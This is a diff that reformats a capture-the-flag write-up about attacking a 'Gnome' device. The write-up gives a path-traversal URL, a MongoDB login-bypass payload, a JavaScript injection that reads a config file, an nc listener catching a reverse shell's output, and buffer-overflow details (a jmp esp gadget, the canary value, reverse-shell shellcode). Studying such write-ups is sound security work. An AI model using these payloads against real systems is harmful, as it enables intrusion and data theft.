@@ -49,13 +49,20 @@ I don't really know what level of detail you expect from the submssions so I wil
 		a. Upload settings file with name ".png/whatever". This creates the directory "gnome/www/public/upload/llCkTnXD/.png/".
 		b. "http://52.34.3.80/cam?camera=../../public/upload/llCkTnXD/.png/../../../../files/gnome.conf"
 	3. Login using a JSON encoded POST body with the following content, then simply download the files from the files menu:
-	> {
-	>   "username": "admin",
-	>   "password": {"$gt": ""}
-	> }
+
+		```json
+		{
+		  "username": "admin",
+		  "password": {"$gt": ""}
+		}
+		```
+
 	4. Upload any dummy png file with the "postproc" form field set to "new Buffer(fs.readFileSync('/gnome/www/files/gnome.conf')).toString('base64')" This will give you back a string which can then be base 64 decoded to get the file. Repeat this for all six files. 
 	5. First we prepare our reverse shell by running the following command which will send back a base64 encoded file to us:
-	> echo "cat /gnome/www/files/gnome.conf | base64" | nc -l 55555 | base64 -d > gnome.conf  
+
+		```bash
+		echo "cat /gnome/www/files/gnome.conf | base64" | nc -l 55555 | base64 -d > gnome.conf
+		```
 
 		Then we connect to the service and send "X\n" to the server to get to the secret command. Then we send a payload consisting of the following parts.
 		
@@ -157,31 +164,37 @@ By running binwalk on the firmware image, we see that it consists of three parts
   2. The firmware binary, a 32-bit ELF compiled for ARM. This gives us the first half of the answer.
   3. A SquashFS file system
 
-> binwalk giyh-firmware-dump.bin 
-> 		
-> 	DECIMAL       HEXADECIMAL     DESCRIPTION
-> 	--------------------------------------------------------------------------------
-> 	0             0x0             PEM certificate
-> 	1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
-> 	168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015
+```console
+$ binwalk giyh-firmware-dump.bin
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PEM certificate
+1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
+168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015
+```
 
 Using the "-e" flag with binwalk, I extracted the SquashFS filesystem.
 Then by using the tool "unsquashfs", I decompressed into a regular directory which can be explored.
 
 By looking at the "init" file in the root, we suspect that the Gnome is running OpenWRT.
 
-> cat squashfs-root/init
->
-> 	#!/bin/sh
-> 	# Copyright (C) 2006 OpenWrt.org
-> 	export INITRAMFS=1
-> 	exec /sbin/init
+```console
+$ cat squashfs-root/init
+
+#!/bin/sh
+# Copyright (C) 2006 OpenWrt.org
+export INITRAMFS=1
+exec /sbin/init
+```
 
 Searching for the string "openwrt" in the file system yields 239 hits and we conclude that this is OpenWRT.
 
-> grep -ri openwrt squashfs-root | wc -l
->
-> 	239
+```console
+$ grep -ri openwrt squashfs-root | wc -l
+
+239
+```
 
 Now we can answer questions three: ARM, OpenWRT
 
@@ -294,10 +307,12 @@ router.post('/', function(req, res, next) {
 
 This allows for a MongoDB injection, similar to a classical SQL injection. One way to do this is to notice that the ExpressJS framework is used with the body-parser middleware (app.js:20-21). This means that we can send our HTTP POST data as JSON and create the following payload:
 
-> {
->   "username": "admin",
->   "password": {"$gt": ""}
-> }
+```json
+{
+  "username": "admin",
+  "password": {"$gt": ""}
+}
+```
 
 This is then directly unserialized and sent to the Mongo "findOne" function which creates a query which says: "find the user with username = admin and a password which is greater than the empty string". Only the admin user will satisfy the first clause and any text string, i.e. any password will satisfy the second clause. This means that the admin user will be found, no matter the actual password of that user and we will be logged in as admin.
 
@@ -370,11 +385,13 @@ I must say that I liked this idea of introducing how to repair a stack canary wi
 
 First I got some shellcode. I have heard that real hackers write their own, but I have also heard that it's unnecessary to invent the wheel twice, so I grabbed a reverse shell shellcode from Shell Storm. Secondly, to defeat the ASLR, I wanted a "jmp esp" gadget. For this I needed a compiled version of the binary. Luckily it was found in "/usr/bin/sgstatd" of the gnome firmware. Running the tool "ROPGadget" on this binary gave me the gadget address.
 
->  ROPgadget --binary sgstatd  
->   
-> 	...  
-> 	0x0804936b : jmp esp  
-> 	...  
+```console
+$ ROPgadget --binary sgstatd
+
+...
+0x0804936b : jmp esp
+...
+```
 
 I also needed to know exactly where the canary ended up in relation to the buffer. This was done by running the binary locally and sending a payload of blocks of four letters, i.e. "AAAABBBBCCCC..." etc. and then breaking at the "movl -4(%ebp)" instruction. By doing this, I fiured out that I needed 103 bytes of whatever followed by the canary value "0xe4ffffe4". I then did the same thing to figure out exactly where there the saved return address was located to know where to put the address to "jmp esp".
 
